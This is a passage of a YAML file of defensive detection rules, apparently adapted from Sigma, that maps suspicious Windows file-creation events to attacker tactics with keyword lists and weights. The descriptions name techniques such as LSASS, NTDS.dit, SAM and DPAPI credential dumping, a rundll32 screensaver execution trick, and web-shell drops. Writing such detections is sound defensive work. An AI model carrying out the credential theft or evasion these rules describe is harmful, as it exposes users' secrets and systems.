    summary_bonus: 0.1
- id: sigma_2f9356ae_bf43_41b8_b858_4496d83b2acb
  intent: unknown
  tactic: initial_access
  description: Detects the creation of a ISO file in the Outlook temp folder or in
    the Appdata temp folder. Typical of Qakbot TTP from end-July 2022.
  conditions:
    summary:
      regex_any:
      - file
      - created
      - within
      - temp
      - folders
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4358e5a5_7542_4dcb_b9f3_87667371839b
  intent: unknown
  tactic: initial_access
  description: 'Detects the creation of recent element file that points to an .ISO,
    .IMG, .VHD or .VHDX file as often used in phishing attacks.

    This can be a false positive on server systems but on workstations users should
    rarely mount .iso or .img files.

    '
  conditions:
    summary:
      regex_any:
      - image
      - mount
      - indicator
      - recent
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f92a6f1e_a512_4a15_9735_da09e78d7273
  intent: reconnaissance
  tactic: discovery
  description: Detects creation of files which are the results of executing the built-in
    reconnaissance script "C:\Windows\System32\gatherNetworkInfo.vbs".
  conditions:
    summary:
      regex_any:
      - gathernetworkinfo
      - reconnaissance
      - script
      - output
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5a2d357_1ab8_4675_a967_ef9990a59391
  intent: credential_harvesting
  tactic: credential_access
  description: Detects creation of files with names used by different memory dumping
    tools to create a memory dump of the LSASS process memory, which contains user
    credentials.
  conditions:
    summary:
      regex_any:
      - lsass
      - process
      - memory
      - dump
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6902955a_01b7_432c_b32a_6f5f81d8f625
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the presence of an LSASS dump file in the "CrashDumps" folder.
    This could be a sign of LSASS credential dumping. Techniques such as the LSASS
    Shtinkering have been seen abusing the Windows Error Reporting to dump said process.
  conditions:
    summary:
      regex_any:
      - lsass
      - process
      - dump
      - artefact
      - crashdumps
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3e76af5_4ce0_4a14_9c9a_25ceb8fda182
  intent: credential_harvesting
  tactic: credential_access
  description: Detects WerFault creating a dump file with a name that indicates that
    the dump file could be an LSASS process memory, which contains user credentials
  conditions:
    summary:
      regex_any:
      - werfault
      - lsass
      - process
      - memory
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0bcfabcb_7929_47f4_93d6_b33fb67d34d1
  intent: execution
  tactic: execution
  description: Detects javaw.exe in AppData folder as used by Adwind / JRAT
  conditions:
    summary:
      regex_any:
      - adwind
      - jrat
      - file
      - artifact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_805c55d9_31e6_4846_9878_c34c75054fe9
  intent: unknown
  tactic: initial_access
  description: Detects Octopus Scanner Malware.
  conditions:
    summary:
      regex_any:
      - octopus
      - scanner
      - malware
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_318557a5_150c_4c8d_b70e_a9910e199857
  intent: persistence_installation
  tactic: persistence
  description: Detects msdt.exe creating files in suspicious directories which could
    be a sign of exploitation of either Follina or Dogwalk vulnerabilities
  conditions:
    summary:
      regex_any:
      - file
      - creation
      - suspicious
      - directory
      - msdt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c61daa90_3c1e_4f18_af62_8f288b5c9aaf
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of files with scripting or executable extensions
    by Mysql daemon.

    Which could be an indicator of "User Defined Functions" abuse to download malware.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - file
      - creation
      - mysql
      - daemon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0b06658_7d1d_4cd3_bf15_03467507ff7c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of Usage Log files by the CLR (clr.dll). These
    files are named after the executing process once the assembly is finished executing
    for the first time in the (user) session context.
  conditions:
    summary:
      regex_any:
      - suspicious
      - dotnet
      - usage
      - artifact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7b50671_d1ad_4871_aa60_5aa5b331fe04
  intent: execution
  tactic: execution
  description: Detects the creation of suspicious files and folders inside the user's
    AppData folder but not inside any of the common and well known directories (Local,
    Romaing, LocalLow). This method could be used as a method to bypass detection
    who exclude the AppData folder in fear of FPs
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - creation
      - uncommon
      - appdata
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c048f047_7e2a_4888_b302_55f509d4a91d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of screensaver files (.scr) outside of system
    folders. Attackers may execute an application as an ".SCR" file using "rundll32.exe
    desk.cpl,InstallScreenSaver" for example.
  conditions:
    summary:
      regex_any:
      - file
      - write
      - event
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_54127bd4_f541_4ac3_afdb_ea073f63f692
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of new ".dll" files inside the plugins directory of
    a notepad++ installation by a process other than "gup.exe". Which could indicates
    possible persistence
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - notepad
      - plugins
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4e7050dd_e548_483f_b7d6_527ab4fa784d
  intent: credential_harvesting
  tactic: credential_access
  description: Detects creation of a file named "ntds.dit" (Active Directory Database)
    by an uncommon parent process or directory
  conditions:
    summary:
      regex_any:
      - ntds
      - creation
      - uncommon
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_11b1ed55_154d_4e82_8ad7_83739298f720
  intent: credential_harvesting
  tactic: credential_access
  description: Detects creation of a file named "ntds.dit" (Active Directory Database)
    by an uncommon process or a process located in a suspicious directory
  conditions:
    summary:
      regex_any:
      - ntds
      - creation
      - uncommon
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3a8da4e0_36c1_40d2_8b29_b3e890d5172a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects creation of files with specific name patterns seen used in
    various tools that export the NTDS.DIT for exfiltration.
  conditions:
    summary:
      regex_any:
      - ntds
      - exfiltration
      - filename
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8e1cb247_6cf6_42fa_b440_3f27d57e9936
  intent: persistence_installation
  tactic: persistence
  description: Detects potential persistence activity via startup add-ins that load
    when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - microsoft
      - office
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e29e3a7_1ad8_40aa_b691_9f82ecd33d66
  intent: unknown
  tactic: initial_access
  description: Detects the creation of a new office macro files on the systems via
    an application (browser, mail client).
  conditions:
    summary:
      regex_any:
      - office
      - macro
      - file
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1c50487_1967_4315_a026_6491686d860e
  intent: unknown
  tactic: initial_access
  description: Detects the creation of a office macro file from a a suspicious process
  conditions:
    summary:
      regex_any:
      - office
      - macro
      - file
      - creation
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7fd164ba_126a_4d9c_9392_0d4f7c243df0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects creation of files with the ".one"/".onepkg" extension in suspicious
    or uncommon locations. This could be a sign of attackers abusing OneNote attachments
  conditions:
    summary:
      regex_any:
      - onenote
      - attachment
      - file
      - dropped
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fcc6d700_68d9_4241_9a1a_06874d621b06
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious files created via the OneNote application. This
    could indicate a potential malicious ".one"/".onepkg" file was executed as seen
    being used in malware activity in the wild
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - created
      - onenote
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c31f563_f9a7_450c_bfa8_35f8f32f1f61
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of a macro file for Outlook.
  conditions:
    summary:
      regex_any:
      - outlook
      - macro
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3edc6a5_d9d4_48d8_930e_aab518390917
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a new Outlook form which can contain malicious
    code
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - outlook
      - form
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fabb0e80_030c_4e3e_a104_d09676991ac3
  intent: unknown
  tactic: initial_access
  description: 'Detects the creation of files with suspicious file extensions in the
    temporary directory that Outlook uses when opening attachments.

    This can be used to detect spear-phishing campaigns that use suspicious files
    as attachments, which may contain malicious code.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - created
      - outlook
      - temporary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_117d3d3a_755c_4a61_b23e_9171146d094c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of a macro file for Outlook.
  conditions:
    summary:
      regex_any:
      - suspicious
      - outlook
      - macro
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3d2a2d59_929c_4b78_8c1a_145dfe9e07b1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects creation of files with the ".pub" extension in suspicious or
    uncommon locations. This could be a sign of attackers abusing Publisher documents
  conditions:
    summary:
      regex_any:
      - publisher
      - attachment
      - file
      - dropped
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e20c89d_2264_44ae_8238_aeeaba609ece
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of Microsoft Office files inside of one of the default
    startup folders in order to achieve persistence.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - microsoft
      - office
      - startup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7a74c80_ba5a_486e_9974_ab9e682bc5e4
  intent: execution
  tactic: execution
  description: Detects the creation of files with an executable or script extension
    by an Office application.
  conditions:
    summary:
      regex_any:
      - file
      - with
      - uncommon
      - extension
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a10a2c40_2c4d_49f8_b557_1a946bc55d9d
  intent: unknown
  tactic: resource_development
  description: Detects the creation of a file with an uncommon extension in an Office
    application startup folder
  conditions:
    summary:
      regex_any:
      - uncommon
      - file
      - created
      - office
      - startup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e90ae7a_7cd3_473f_a035_4ebb72d961da
  intent: execution
  tactic: execution
  description: Detects processes creating temp files related to PCRE.NET package
  conditions:
    summary:
      regex_any:
      - pcre
      - package
      - temp
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bbb7e38c_0b41_4a11_b306_d2a457b7ac2b
  intent: execution
  tactic: execution
  description: Detects suspicious file based on their extension being created in "C:\PerfLogs\".
    Note that this directory mostly contains ".etl" files
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - created
      - perflogs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7047d730_036f_4f40_b9d8_1c63e36d5e62
  intent: persistence_installation
  tactic: persistence
  description: Detects PowerShell creating a binary executable or a script file.
  conditions:
    summary:
      regex_any:
      - potential
      - binary
      - script
      - dropper
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f331aa1f_8c53_4fc3_b083_cc159bc971cb
  intent: execution
  tactic: execution
  description: Detects the creation of known offensive powershell scripts used for
    exploitation
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - scripts
      - filecreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e8a52bbd_bced_459f_bd93_64db45ce7657
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a new PowerShell module in the first folder
    of the module directory structure "\WindowsPowerShell\Modules\malware\malware.psm1".
    This is somewhat an uncommon practice as legitimate modules often includes a version
    folder.
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - powershell
      - module
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3845023_ca9a_4024_b2b2_5422156d5527
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a new PowerShell module ".psm1", ".psd1", ".dll",
    ".ps1", etc. by a non-PowerShell process
  conditions:
    summary:
      regex_any:
      - powershell
      - module
      - file
      - created
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92fa78e7_4d39_45f1_91a3_8b23f3f1088d
  intent: persistence_installation
  tactic: persistence
  description: 'Detects PowerShell writing startup shortcuts.

    This procedure was highlighted in Red Canary Intel Insights Oct. 2021, "We frequently
    observe adversaries using PowerShell to write malicious .lnk files into the startup
    directory to establish persistence.

    Accordingly, this detection opportunity is likely to identify persistence mechanisms
    in multiple threats.

    In the context of Yellow Cockatoo, this persistence mechanism eventually launches
    the command-line script that leads to the installation of a malicious DLL"

    '
  conditions:
    summary:
      regex_any:
      - potential
      - startup
      - shortcut
      - persistence
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1027d292_dd87_4a1a_8701_2abe04d7783c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of the "PSScriptPolicyTest" PowerShell script
    by an uncommon process. This file is usually generated by Microsoft Powershell
    to test against Applocker.
  conditions:
    summary:
      regex_any:
      - psscriptpolicytest
      - creation
      - uncommon
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34986307_b7f4_49be_92f3_e7a4d01ac5db
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects Rclone config files being created
  conditions:
    summary:
      regex_any:
      - rclone
      - config
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fccfb43e_09a7_4bd2_8b37_a5a7df33386d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects creation of a file with an ".rdp" extension by an application
    that doesn''t commonly create such files.

    '
  conditions:
    summary:
      regex_any:
      - file
      - created
      - uncommon
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_130c9e58_28ac_4f83_8574_0a4cc913b97e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects files dropped by Winnti as described in RedMimicry Winnti playbook
  conditions:
    summary:
      regex_any:
      - potential
      - winnti
      - dropper
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_145095eb_e273_443b_83d0_f9b519b7867b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of a file with the ".pdf" extension by the "RegEdit.exe"
    process.

    This indicates that a user is trying to print/save a registry key as a PDF in
    order to potentially extract sensitive information and bypass defenses.

    '
  conditions:
    summary:
      regex_any:
      - file
      - created
      - regedit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7eff1a7f_dd45_4c20_877a_f21e342a7611
  intent: unknown
  tactic: s0029
  description: Detects default RemCom service filename which indicates RemCom service
    installation and execution
  conditions:
    summary:
      regex_any:
      - remcom
      - service
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fec96f39_988b_4586_b746_b93d59fd1922
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - screenconnect
      - temporary
      - installation
      - artefact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a6976974_ea6f_4e97_818e_ea08625c52cb
  intent: persistence_installation
  tactic: persistence
  description: 'Detects a phishing attack which expands a ZIP file containing a malicious
    shortcut.

    If the victim expands the ZIP file via the explorer process, then the explorer
    process expands the malicious ZIP file and drops a malicious shortcut redirected
    to a backdoor into the Startup folder.

    Additionally, the file name of the malicious shortcut in Startup folder contains
    {0AFACED1-E828-11D1-9187-B532F1E9575D} meaning the folder shortcut operation.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - ripzip
      - attack
      - startup
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4e87b8e2_2ee9_4b2a_a715_4727d297ece0
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation of files that look like exports of the local SAM
    (Security Account Manager)
  conditions:
    summary:
      regex_any:
      - potential
      - database
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_760e75d8_c3b5_409b_a9bf_6130b4c4603f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of Self Extraction Directive files (.sed) in
    a potentially suspicious location.

    These files are used by the "iexpress.exe" utility in order to create self extracting
    packages.

    Attackers were seen abusing this utility and creating PE files with embedded ".sed"
    entries.

    '
  conditions:
    summary:
      regex_any:
      - self
      - extraction
      - directive
      - file
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1277f594_a7d1_4f28_a2d3_73af5cbeab43
  intent: execution
  tactic: execution
  description: Detects Windows shells and scripting applications that write files
    to suspicious folders
  conditions:
    summary:
      regex_any:
      - windows
      - shell
      - scripting
      - application
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b8fd0e93_ff58_4cbd_8f48_1c114e342e62
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Windows executables that write files with suspicious extensions
  conditions:
    summary:
      regex_any:
      - windows
      - binaries
      - write
      - suspicious
      - extensions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2aa0a6b4_a865_495b_ab51_c28249537b75
  intent: persistence_installation
  tactic: persistence
  description: A General detection for files being created in the Windows startup
    directory. This could be an indicator of persistence.
  conditions:
    summary:
      regex_any:
      - startup
      - folder
      - file
      - write
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e15b518d_b4ce_4410_a9cd_501f23ce4a18
  intent: defense_evasion
  tactic: defense_evasion
  description: Once executed, colorcpl.exe will copy the arbitrary file to c:\windows\system32\spool\drivers\color\
  conditions:
    summary:
      regex_any:
      - suspicious
      - creation
      - with
      - colorcpl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_409f8a98_4496_4aaa_818a_c931c0a8b832
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects suspicious files created by Microsoft Sync Center
    (mobsync)
  conditions:
    summary:
      regex_any:
      - created
      - files
      - microsoft
      - sync
      - center
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f87308a_0a5b_4623_ae15_d8fa1809bc60
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of copy of suspicious files (EXE/DLL) to the default
    GPO storage folder
  conditions:
    summary:
      regex_any:
      - suspicious
      - files
      - default
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fc4f4817_0c53_4683_a4ee_b17a64bc1039
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious Microsoft desktopimgdownldr file creation that
    stores a file to a suspicious location or contains a file with a suspicious extension
  conditions:
    summary:
      regex_any:
      - suspicious
      - desktopimgdownldr
      - target
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_81315b50_6b60_4d8f_9928_3466e1022515
  intent: persistence_installation
  tactic: persistence
  description: Detects unusual processes accessing desktop.ini, which can be leveraged
    to alter how Explorer displays a folder's content (i.e. renaming files) without
    changing them on disk.
  conditions:
    summary:
      regex_any:
      - suspicious
      - desktop
      - action
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_caf02a0a_1e1c_4552_9b48_5e070bd88d11
  intent: impact_operations
  tactic: impact
  description: Ransomware create txt file in the user Desktop
  conditions:
    summary:
      regex_any:
      - suspicious
      - creation
      - file
      - user
      - desktop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b4926b47_a9d7_434c_b3a0_adc3fa0bd13e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects dropped files with double extensions, which is often used by
    malware as a method to abuse the fact that Windows hide default extensions by
    default.
  conditions:
    summary:
      regex_any:
      - suspicious
      - double
      - extension
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7892ec59_c5bb_496d_8968_e5d210ca3ac4
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects file names with specific patterns seen generated and used
    by tools such as Mimikatz and DSInternals related to exported or stolen DPAPI
    backup keys and certificates.

    '
  conditions:
    summary:
      regex_any:
      - dpapi
      - backup
      - keys
      - certificate
      - export
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7280c9f3_a5af_45d0_916a_bc01cb4151c9
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious activity in which the MSExchangeMailboxReplication
    process writes .asp and .apsx files to disk, which could be a sign of ProxyShell
    exploitation
  conditions:
    summary:
      regex_any:
      - suspicious
      - msexchangemailboxreplication
      - aspx
      - write
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74babdd6_a758_4549_9632_26535279e654
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detect creation of suspicious executable file names.

    Some strings look for suspicious file extensions, others look for filenames that
    exploit unquoted service paths.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - executable
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f0489be_b496_4ddf_b3a9_5900f2044e9c
  intent: persistence_installation
  tactic: persistence
  description: 'Detects suspicious file writes to SharePoint layouts directory which
    could indicate webshell activity or post-exploitation.

    This behavior has been observed in the exploitation of SharePoint vulnerabilities
    such as CVE-2025-49704, CVE-2025-49706 or CVE-2025-53770.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - write
      - sharepoint
      - layouts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_89c42960_f244_4dad_9151_ae9b1a3287a2
  intent: unknown
  tactic: initial_access
  description: 'Detects suspicious file writes to the root directory of web applications,
    particularly Apache web servers or Tomcat servers.

    This may indicate an attempt to deploy malicious files such as web shells or other
    unauthorized scripts.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - write
      - webapps
      - root
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c3fac91_5627_46e8_a6a8_a0d7b9b8ae1b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Get-Variable is a valid PowerShell cmdlet

    WindowsApps is by default in the path where PowerShell is executed.

    So when the Get-Variable command is issued on PowerShell execution, the system
    first looks for the Get-Variable executable in the path and executes the malicious
    binary instead of looking for the PowerShell cmdlet.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - variable
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a8f866e1_bdd4_425e_a27a_37619238d9c7
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of hidden file/folder with the "::$index_allocation"
    stream. Which can be used as a technique to prevent access to folder and files
    from tooling such as "explorer.exe" and "powershell.exe"

    '
  conditions:
    summary:
      regex_any:
      - potential
      - hidden
      - directory
      - creation
      - ntfs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f1707b1_b50b_45b4_b5a2_3978b5a5d0d6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the presence of unicode characters which are homoglyphs, or
    identical in appearance, to ASCII letter characters.

    This is used as an obfuscation and masquerading techniques. Only "perfect" homoglyphs
    are included; these are characters that

    are indistinguishable from ASCII characters and thus may make excellent candidates
    for homoglyph attack characters.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - homoglyph
      - attack
      - using
      - lookalike
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_654fcc6d_840d_4844_9b07_2c3300e54a26
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects programs on a Windows system that should not write an archive
    to disk
  conditions:
    summary:
      regex_any:
      - legitimate
      - application
      - dropped
      - archive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0540f7e_2db3_4432_b9e0_3965486744bc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects programs on a Windows system that should not write executables
    to disk
  conditions:
    summary:
      regex_any:
      - legitimate
      - application
      - dropped
      - executable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d604714_e071_49ff_8726_edeb95a70679
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects programs on a Windows system that should not write scripts
    to disk
  conditions:
    summary:
      regex_any:
      - legitimate
      - application
      - dropped
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3215aa19_f060_4332_86d5_5602511f3ca8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of files with an "LNK" as a second extension.
    This is sometimes used by malware as a method to abuse the fact that Windows hides
    the "LNK" extension by default.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - double
      - extension
      - file
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5b78988_486d_4a80_b991_930eff3ff8bf
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation or modification of a powershell profile which
    could indicate suspicious activity as the profile can be used as a mean of persistence
  conditions:
    summary:
      regex_any:
      - powershell
      - profile
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3da70954_0f2c_4103_adff_b7440368f50e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of the PROCEXP152.sys file in the application-data
    local temporary folder.

    This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU)
    or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses
    KDU.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - procexp152
      - file
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b447f7de_1e53_4cbf_bfb4_f1f6d0b04e4e
  intent: execution
  tactic: execution
  description: Detects the creation of a file with a suspicious extension in the public
    folder, which could indicate potential malicious activity.
  conditions:
    summary:
      regex_any:
      - suspicious
      - binaries
      - scripts
      - public
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd8b36ac_8e4a_4c2f_a402_a29b8fbd5bca
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects file write event from/to a fake recycle bin folder that is
    often used as a staging directory for malware
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - creation
      - activity
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_979baf41_ca44_4540_9d0c_4fcef3b5a3a4
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects suspicious filenames that contain a right-to-left override
    character and a potentially spoofed file extensions.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - file
      - extension
      - spoofing
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ce7066a6_508a_42d3_995b_2952c65dc2ce
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of suspcious binary files inside the "\windows\system32\spool\drivers\color\"
    as seen in the blog referenced below
  conditions:
    summary:
      regex_any:
      - drop
      - binaries
      - into
      - spool
      - drivers
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28208707_fe31_437f_9a7f_4b1108b94d2e
  intent: persistence_installation
  tactic: persistence
  description: 'Detects the creation of potentially malicious script and executable
    files in Windows startup folders, which is a common persistence technique used
    by threat actors.

    These files (.ps1, .vbs, .js, .bat, etc.) are automatically executed when a user
    logs in, making the Startup folder an attractive target for attackers.

    This technique is frequently observed in malvertising campaigns and malware distribution
    where attackers attempt to maintain long-term access to compromised systems.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - startup
      - folder
